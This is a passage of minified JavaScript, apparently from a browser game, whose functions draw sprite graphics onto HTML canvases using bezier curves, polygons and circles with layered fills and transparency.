      ye(n, undefined, t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 212, e * 210);
      n.bezierCurveTo(e * 286, e * 210, e * 331, e * 254, e * 212, e * 276);
      n.bezierCurveTo(e * 108, e * 276, e * 112, e * 222, e * 213, e * 208);
      n.closePath();
      ye(n, t[3], t[4], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 200);
      n.bezierCurveTo(e * 126, e * 216, e * 177, e * 232, e * 213, e * 237);
      n.bezierCurveTo(e * 266, e * 218, e * 288, e * 209, e * 318, e * 190);
      n.bezierCurveTo(e * 269, e * 164, e * 239, e * 158, e * 214, e * 153);
      n.bezierCurveTo(e * 148, e * 172, e * 131, e * 182, e * 98, e * 200);
      n.closePath();
      ye(n, t[0], t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 97, e * 204);
      n.bezierCurveTo(e * 97, e * 215.5, e * 97, e * 215.5, e * 97, e * 227);
      n.bezierCurveTo(e * 148, e * 250, e * 179, e * 256, e * 212, e * 262);
      n.bezierCurveTo(e * 268, e * 244, e * 281, e * 233, e * 318, e * 214);
      n.bezierCurveTo(e * 318, e * 203, e * 318, e * 203, e * 318, e * 192);
      n.bezierCurveTo(e * 250, e * 225, e * 236, e * 231, e * 214, e * 239);
      n.bezierCurveTo(e * 158, e * 228, e * 126, e * 215, e * 99, e * 201);
      n.closePath();
      ye(n, t[2], t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 212, e * 260);
      n.bezierCurveTo(e * 212, e * 251.5, e * 212, e * 251.5, e * 212, e * 243);
      n.closePath();
      ye(n, undefined, t[1], e * 14);
      ze(n, e * 161, e * 201, e * 13);
      ye(n, t[5]);
      ze(n, e * 216, e * 205, e * 8.06225774829855);
      ye(n, t[5]);
      ze(n, e * 216, e * 175, e * 6.708203932499369);
      ye(n, t[5]);
      ze(n, e * 271, e * 191, e * 5.0990195135927845);
      ye(n, t[5]);
      ze(n, e * 206, e * 180, e * 11.180339887498949);
      ye(n, t[5]);
      return r;
    }
    function Ai(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.save();
      n.translate(e * 85, e * 237);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 54.585977194239184, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 178, e * 238);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 52.53573932334064, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 270, e * 239);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 53.58058329516393, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 222, e * 312);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 52.53573932334064, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 317, e * 159);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 57.63465889766331, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 223.5, e * 139.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 51.66236541235796, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 132.5, e * 137.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 52.009614495783374, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 178.5, e * 58.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 53.16013544000805, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 177.5, e * 216.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 50, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 84.5, e * 215.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 54, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 319.5, e * 138.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 55.08175741568164, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 269.5, e * 216.0625);
      n.rotate(1.5707963267948966);
      Ve(n, 6, e * 54.589376255824725, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.save();
      n.translate(e * 221.5, e * 293.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 49.49747468305833, e * 1);
      n.restore();
      ye(n, t[1], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 221.5, e * 342.0625);
      n.bezierCurveTo(e * 221.5, e * 350.5625, e * 221.5, e * 350.5625, e * 221.5, e * 359.0625);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.5, e * 270.0625);
      n.bezierCurveTo(e * 84.5, e * 277.0625, e * 84.5, e * 277.0625, e * 84.5, e * 284.0625);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.save();
      n.translate(e * 84.5, e * 215.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 177.5, e * 215.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 222.5, e * 294.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 270.5, e * 216.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 320.5, e * 134.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 224.5, e * 138.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 133.5, e * 137.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      n.save();
      n.translate(e * 178.5, e * 56.0625);
      n.rotate(0.5235987755982988);
      Ve(n, 6, e * 30, e * 15);
      n.restore();
      ye(n, t[3]);
      return r;
    }
    function di(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 52;
      r.height = e * 65;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 9.833328247070312, e * 12.078125);
      n.bezierCurveTo(e * 15.333328247070312, e * 28.078125, e * 15.333328247070312, e * 28.078125, e * 20.833328247070312, e * 44.078125);
      n.closePath();
      ye(n, undefined, t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 7.8333282470703125, e * 20.078125);
      n.bezierCurveTo(e * 16.833328247070312, e * 32.578125, e * 16.833328247070312, e * 32.578125, e * 25.833328247070312, e * 45.078125);
      n.closePath();
      ye(n, undefined, t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 23.833328247070312, e * 26.078125);
      n.bezierCurveTo(e * 25.833328247070312, e * 11.078125, e * 16.833328247070312, e * 8.078125, e * 14.833328247070312, e * 7.078125);
      n.bezierCurveTo(e * 11.833328247070312, e * 17.078125, e * 13.833328247070312, e * 22.078125, e * 23.833328247070312, e * 27.078125);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35.83332824707031, e * 8.078125);
      n.bezierCurveTo(e * 34.83332824707031, e * 27.078125, e * 28.833328247070312, e * 27.078125, e * 23.833328247070312, e * 28.078125);
      n.bezierCurveTo(e * 21.833328247070312, e * 14.078125, e * 26.833328247070312, e * 11.078125, e * 35.83332824707031, e * 8.078125);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 25.833328247070312, e * 39.078125);
      n.bezierCurveTo(e * 20.833328247070312, e * 29.078125, e * 14.833328247070312, e * 27.078125, e * 5.8333282470703125, e * 29.078125);
      n.bezierCurveTo(e * 9.833328247070312, e * 39.078125, e * 16.833328247070312, e * 42.078125, e * 25.833328247070312, e * 40.078125);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.83332824707031, e * 23.078125);
      n.bezierCurveTo(e * 35.83332824707031, e * 35.078125, e * 31.833328247070312, e * 37.078125, e * 25.833328247070312, e * 36.078125);
      n.bezierCurveTo(e * 25.833328247070312, e * 24.078125, e * 33.83332824707031, e * 21.078125, e * 42.83332824707031, e * 23.078125);
      n.closePath();
      ye(n, t[0], t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 23.833328247070312, e * 24.078125);
      n.bezierCurveTo(e * 20.833328247070312, e * 34.078125, e * 23.833328247070312, e * 40.078125, e * 27.833328247070312, e * 43.078125);
      n.bezierCurveTo(e * 37.33332824707031, e * 28.078125, e * 37.33332824707031, e * 28.078125, e * 46.83332824707031, e * 13.078125);
      ye(n, undefined, t[1], e * 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 38.83332824707031, e * 14.078125);
      n.bezierCurveTo(e * 34.83332824707031, e * 24.078125, e * 34.83332824707031, e * 24.078125, e * 30.833328247070312, e * 34.078125);
      ye(n, undefined, t[1], e * 2);
      return r;
    }
    function hi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 173;
      n.translate(e * 5, e * 5);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      n.rotate(0.32);
      Ve(n, 7, e * 42.15447781671598, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      n.rotate(0.32);
      Ve(n, 7, e * 42.15447781671598, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      n.rotate(0.28);
      Ve(n, 7, e * 30.463092423455635, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      n.rotate(0.28);
      Ve(n, 7, e * 30.463092423455635, e * 10);
      n.restore();
      ye(n, t[3], t[4], e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      ze(n, e * 86.25, e * 84.953125, e * 18.867962264113206);
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      ze(n, e * 86.25, e * 84.953125, e * 18.867962264113206);
      ye(n, t[5], t[6], e * 4);
      return r;
    }
    function Ii(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 173;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 85.25, e * 82.953125);
      n.bezierCurveTo(e * 98.25, e * 46.453125, e * 98.25, e * 46.453125, e * 111.25, e * 9.953125);
      n.closePath();
      ye(n, undefined, t[0], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111.25, e * 8.953125);
      n.bezierCurveTo(e * 117.75, e * 12.453125, e * 117.75, e * 12.453125, e * 124.25, e * 15.953125);
      n.bezierCurveTo(e * 113.75, e * 39.953125, e * 113.75, e * 39.953125, e * 103.25, e * 63.953125);
      n.bezierCurveTo(e * 97.75, e * 64.953125, e * 97.75, e * 64.953125, e * 92.25, e * 65.953125);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111.25, e * 8.953125);
      n.bezierCurveTo(e * 117.75, e * 12.453125, e * 117.75, e * 12.453125, e * 124.25, e * 15.953125);
      n.bezierCurveTo(e * 113.75, e * 39.953125, e * 113.75, e * 39.953125, e * 103.25, e * 63.953125);
      n.bezierCurveTo(e * 97.75, e * 64.953125, e * 97.75, e * 64.953125, e * 92.25, e * 65.953125);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 85.25, e * 82.953125);
      n.bezierCurveTo(e * 98.25, e * 46.453125, e * 98.25, e * 46.453125, e * 111.25, e * 9.953125);
      n.closePath();
      ye(n, undefined, t[6], e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.25, e * 84.953125);
      n.bezierCurveTo(e * 123.75, e * 100.453125, e * 123.75, e * 100.453125, e * 160.25, e * 115.953125);
      n.closePath();
      ye(n, undefined, t[0], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 160.25, e * 114.953125);
      n.bezierCurveTo(e * 156.25, e * 122.453125, e * 156.25, e * 122.453125, e * 152.25, e * 129.953125);
      n.bezierCurveTo(e * 130.25, e * 117.953125, e * 130.25, e * 117.953125, e * 108.25, e * 105.953125);
      n.bezierCurveTo(e * 107.25, e * 98.953125, e * 107.25, e * 98.953125, e * 106.25, e * 91.953125);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 160.25, e * 114.953125);
      n.bezierCurveTo(e * 156.25, e * 122.453125, e * 156.25, e * 122.453125, e * 152.25, e * 129.953125);
      n.bezierCurveTo(e * 130.25, e * 117.953125, e * 130.25, e * 117.953125, e * 108.25, e * 105.953125);
      n.bezierCurveTo(e * 107.25, e * 98.953125, e * 107.25, e * 98.953125, e * 106.25, e * 91.953125);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.25, e * 84.953125);
      n.bezierCurveTo(e * 123.75, e * 100.453125, e * 123.75, e * 100.453125, e * 160.25, e * 115.953125);
      n.closePath();
      ye(n, undefined, t[6], e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 83.25, e * 83.953125);
      n.bezierCurveTo(e * 47.75, e * 68.453125, e * 47.75, e * 68.453125, e * 12.25, e * 52.953125);
      n.closePath();
      ye(n, undefined, t[0], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 13.25, e * 53.953125);
      n.bezierCurveTo(e * 17.25, e * 46.953125, e * 17.25, e * 46.953125, e * 21.25, e * 39.953125);
      n.bezierCurveTo(e * 42.75, e * 52.453125, e * 42.75, e * 52.453125, e * 64.25, e * 64.953125);
      n.bezierCurveTo(e * 64.25, e * 70.953125, e * 64.25, e * 70.953125, e * 64.25, e * 76.953125);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 13.25, e * 53.953125);
      n.bezierCurveTo(e * 17.25, e * 46.953125, e * 17.25, e * 46.953125, e * 21.25, e * 39.953125);
      n.bezierCurveTo(e * 42.75, e * 52.453125, e * 42.75, e * 52.453125, e * 64.25, e * 64.953125);
      n.bezierCurveTo(e * 64.25, e * 70.953125, e * 64.25, e * 70.953125, e * 64.25, e * 76.953125);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 83.25, e * 83.953125);
      n.bezierCurveTo(e * 47.75, e * 68.453125, e * 47.75, e * 68.453125, e * 12.25, e * 52.953125);
      n.closePath();
      ye(n, undefined, t[6], e * 4);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.25, e * 86.953125);
      n.bezierCurveTo(e * 70.25, e * 123.953125, e * 70.25, e * 123.953125, e * 56.25, e * 160.953125);
      n.closePath();
      ye(n, undefined, t[0], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56.25, e * 159.953125);
      n.bezierCurveTo(e * 49.25, e * 155.453125, e * 49.25, e * 155.453125, e * 42.25, e * 150.953125);
      n.bezierCurveTo(e * 54.25, e * 127.953125, e * 54.25, e * 127.953125, e * 66.25, e * 104.953125);
      n.bezierCurveTo(e * 71.25, e * 104.953125, e * 71.25, e * 104.953125, e * 76.25, e * 104.953125);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 56.25, e * 159.953125);
      n.bezierCurveTo(e * 49.25, e * 155.453125, e * 49.25, e * 155.453125, e * 42.25, e * 150.953125);
      n.bezierCurveTo(e * 54.25, e * 127.953125, e * 54.25, e * 127.953125, e * 66.25, e * 104.953125);
      n.bezierCurveTo(e * 71.25, e * 104.953125, e * 71.25, e * 104.953125, e * 76.25, e * 104.953125);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 84.25, e * 86.953125);
      n.bezierCurveTo(e * 70.25, e * 123.953125, e * 70.25, e * 123.953125, e * 56.25, e * 160.953125);
      n.closePath();
      ye(n, undefined, t[6], e * 4);
      return r;
    }
    function ui(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 170;
      r.height = e * 173;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      Ve(n, 7, e * 9.848857801796104, e * 5);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 86.25, e * 84.953125);
      Ve(n, 7, e * 9.848857801796104, e * 5);
      n.restore();
      ye(n, t[8], t[9], e * 4);
      return r;
    }
    function li(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 75;
      var o = e * 55;
      r.width = a;
      r.height = o;
      n.translate(e * -30, e * -40);
      n.globalAlpha = 1;
      n.beginPath();
      n.bezierCurveTo(e * 67, e * 56, e * 72, e * 71, e * 72, e * 71);
      n.bezierCurveTo(e * 72, e * 71, e * 84, e * 70, e * 75, e * 82);
      n.bezierCurveTo(e * 70, e * 88, e * 61, e * 89, e * 58, e * 89);
      n.bezierCurveTo(e * 55, e * 89, e * 40, e * 89, e * 46, e * 77);
      n.bezierCurveTo(e * 46, e * 77, e * 43, e * 63, e * 43, e * 63);
      n.bezierCurveTo(e * 35, e * 61, e * 35, e * 53, e * 42, e * 47);
      n.bezierCurveTo(e * 48, e * 42, e * 62, e * 41, e * 66, e * 43);
      n.bezierCurveTo(e * 70, e * 45, e * 72, e * 48, e * 67, e * 56);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.bezierCurveTo(e * 68, e * 61, e * 72, e * 76, e * 72, e * 76);
      n.bezierCurveTo(e * 65, e * 85, e * 61, e * 85, e * 49, e * 83);
      n.bezierCurveTo(e * 49, e * 83, e * 44, e * 63, e * 44, e * 63);
      n.bezierCurveTo(e * 54, e * 63, e * 60, e * 63, e * 67, e * 55);
      n.closePath();
      ye(n, t[1]);
      n.beginPath();
      n.moveTo(e * 69, e * 65);
      n.bezierCurveTo(e * 70, e * 61, e * 81, e * 66, e * 86, e * 66);
      n.bezierCurveTo(e * 90, e * 66, e * 97, e * 63, e * 97, e * 56);
      n.bezierCurveTo(e * 97, e * 50, e * 93, e * 47, e * 88, e * 44);
      ye(n, false, t[1], 2);
      n.beginPath();
      n.moveTo(e * 50, e * 48);
      n.bezierCurveTo(e * 43, e * 52, e * 50, e * 54, e * 51, e * 54);
      n.bezierCurveTo(e * 54, e * 54, e * 59, e * 52, e * 59, e * 49);
      n.bezierCurveTo(e * 59, e * 48, e * 55, e * 46, e * 50, e * 48);
      ye(n, t[2]);
      return r;
    }
    function Oi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 195;
      var o = e * 190;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 10;
      var T = e * 35;
      var A = e * 150;
      var d = T / 2;
      var h = A / 2;
      var I = e * 4;
      n.translate(s - e * 5, _ - e * 5);
      n.rotate(-Math.PI / 1.25);
      n.globalAlpha = 1;
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      n.translate(0, 0);
      n.rotate(Math.PI / 3);
      n.globalAlpha = 1;
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      n.translate(0, 5);
      Be(n, -d / 2, -h / 2, T / 2, A / 3, E - 2);
      ye(n, t[1]);
      return r;
    }
    function ci(e, i, t, r, n) {
      var a = document.createElement("canvas");
      var o = a.getContext("2d");
      var s = e * 70;
      var _ = e * 70;
      var E = e * 10;
      var T = e * 5;
      a.width = s;
      a.height = _ + T;
      for (var A = 0; A < i.length; A++) {
        var d = i[A];
        o.globalAlpha = d.a;
        var h = d.f(t, false, d.c);
        o.save();
        o.translate(s / 2 + d.x * e, _ / 2 + d.y * e);
        o.rotate(d.r);
        o.drawImage(h, -h.width / 2, -h.height / 2);
        o.restore();
      }
      var I = [];
      for (A = 0; A < r.length; A++) {
        var u = document.createElement("canvas");
        var l = u.getContext("2d");
        u.width = s;
        u.height = _ + T;
        l.globalAlpha = n / 2;
        if (A == 2) {
          Be(l, 0, T, s, _, E);
        } else {
          Be(l, 0, 0, s, _ + T, E);
        }
        ye(l, "#081a19");
        l.globalAlpha = n;
        Be(l, 0, A == 2 ? T : 0, s, _, E);
        ye(l, r[A]);
        l.globalAlpha = 1;
        if (A == 2) {
          l.drawImage(a, 0, T);
        } else {
          l.drawImage(a, 0, 0);
        }
        I.push(te(u));
      }
      return I;
    }
    function Ri(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 193;
      var o = e * 198;
      var s = e * 140;
      var _ = e * 90;
      r.width = a;
      r.height = o;
      var E = e * 10;
      var T = e * 25;
      var A = e * 180;
      var d = T / 2;
      var h = A / 2;
      var I = e * 4;
      n.translate(e * -25, e * 1);
      n.translate(s, _);
      n.rotate(-Math.PI / 5);
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      n.translate(e * -30, e * -25);
      n.rotate(Math.PI / 3);
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      n.translate(e * 35, e * 30);
      n.rotate(Math.PI / 3);
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      return r;
    }
    function gi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 145;
      var o = e * 145;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 70;
      n.translate(s, _);
      n.globalAlpha = 0.4;
      ze(n, 0, 0, E);
      ye(n, t[0]);
      E = e * 50;
      n.translate(0, 0);
      n.globalAlpha = 0.8;
      ze(n, 0, 0, E);
      ye(n, t[0]);
      E = e * 35;
      n.translate(0, 0);
      n.globalAlpha = 0.8;
      ze(n, 0, 0, E);
      ye(n, t[1]);
      E = e * 20;
      n.translate(0, 0);
      n.globalAlpha = 0.8;
      ze(n, 0, 0, E);
      ye(n, t[2]);
      return r;
    }
    function Ci(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 135;
      var o = e * 190;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 10;
      var T = e * 25;
      var A = e * 180;
      var d = T / 2;
      var h = A / 2;
      var I = e * 4;
      n.translate(s, _);
      n.rotate(-Math.PI / 5);
      n.globalAlpha = 1;
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      n.translate(0, 0);
      n.rotate(Math.PI / 5);
      n.globalAlpha = 1;
      Be(n, -d, -h, T, A, E);
      ye(n, t[0], t[1], I);
      return r;
    }
    function Ni(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 205;
      var o = e * 205;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 100;
      n.translate(s, _);
      n.globalAlpha = 1;
      ze(n, 0, 0, E);
      ye(n, t[0]);
      return r;
    }
    function bi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 370;
      var o = e * 370;
      var s = a / 2;
      var _ = o / 2;
      r.width = a;
      r.height = o;
      var E = e * 180;
      n.globalAlpha = 0.2;
      ze(n, s, _, E);
      ye(n, t[0]);
      return r;
    }
    function Di(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 155;
      r.height = e * 127;
      n.globalAlpha = 0.5;
      n.translate(0, e * 8);
      n.translate(e * -7, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 55, e * 68);
      n.bezierCurveTo(e * 86, e * 64, e * 117, e * 66, e * 134, e * 68);
      n.bezierCurveTo(e * 152, e * 69, e * 165, e * 86, e * 152, e * 104);
      n.bezierCurveTo(e * 146, e * 87, e * 122, e * 89, e * 98, e * 90);
      n.bezierCurveTo(e * 64, e * 89, e * 41, e * 91, e * 36, e * 106);
      n.bezierCurveTo(e * 19, e * 92, e * 31, e * 71, e * 54, e * 69);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -8);
      n.translate(e * 7, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 28);
      n.bezierCurveTo(e * 39, e * 30, e * 37, e * 31, e * 40, e * 32);
      n.bezierCurveTo(e * 22, e * 45, e * 26, e * 58, e * 29, e * 66);
      n.bezierCurveTo(e * 86.5, e * 65, e * 86.5, e * 65, e * 144, e * 64);
      n.bezierCurveTo(e * 151, e * 42, e * 132, e * 20, e * 120, e * 16);
      n.bezierCurveTo(e * 106, e * 12, e * 89, e * 0, e * 73, e * 3);
      n.bezierCurveTo(e * 51, e * 5, e * 36, e * 20, e * 25, e * 28);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 41);
      n.bezierCurveTo(e * 49, e * 31, e * 53, e * 29, e * 62, e * 27);
      n.bezierCurveTo(e * 59, e * 24, e * 56, e * 25, e * 53, e * 24);
      n.bezierCurveTo(e * 67, e * 15, e * 84, e * 12, e * 120, e * 16);
      n.bezierCurveTo(e * 107, e * 11, e * 96, e * 6, e * 85, e * 2);
      n.bezierCurveTo(e * 59, e * 3, e * 54, e * 7, e * 40, e * 17);
      n.bezierCurveTo(e * 32.5, e * 22.5, e * 32.5, e * 22.5, e * 25, e * 28);
      n.bezierCurveTo(e * 32, e * 30, e * 32, e * 30, e * 39, e * 32);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 24, e * 28);
      n.bezierCurveTo(e * 39, e * 30, e * 37, e * 31, e * 40, e * 32);
      n.bezierCurveTo(e * 22, e * 45, e * 26, e * 58, e * 29, e * 66);
      n.bezierCurveTo(e * 86.5, e * 65, e * 86.5, e * 65, e * 144, e * 64);
      n.bezierCurveTo(e * 151, e * 42, e * 132, e * 20, e * 120, e * 16);
      n.bezierCurveTo(e * 106, e * 12, e * 89, e * 0, e * 73, e * 3);
      n.bezierCurveTo(e * 51, e * 5, e * 36, e * 20, e * 25, e * 28);
      n.closePath();
      ye(n, undefined, t[2], e * 4);
      ze(n, e * 18, e * 38, e * 14.866068747318506);
      ye(n, t[4], t[5], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 30);
      n.bezierCurveTo(e * 27, e * 38, e * 25, e * 50, e * 26, e * 60);
      n.bezierCurveTo(e * 36.5, e * 58.5, e * 36.5, e * 58.5, e * 47, e * 57);
      ye(n, t[1], t[2], e * 4);
      n.translate(e * -7, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 74);
      n.bezierCurveTo(e * 38, e * 77.5, e * 38, e * 77.5, e * 49, e * 81);
      n.bezierCurveTo(e * 54.5, e * 75.5, e * 54.5, e * 75.5, e * 60, e * 70);
      n.bezierCurveTo(e * 64, e * 72, e * 64, e * 72, e * 68, e * 74);
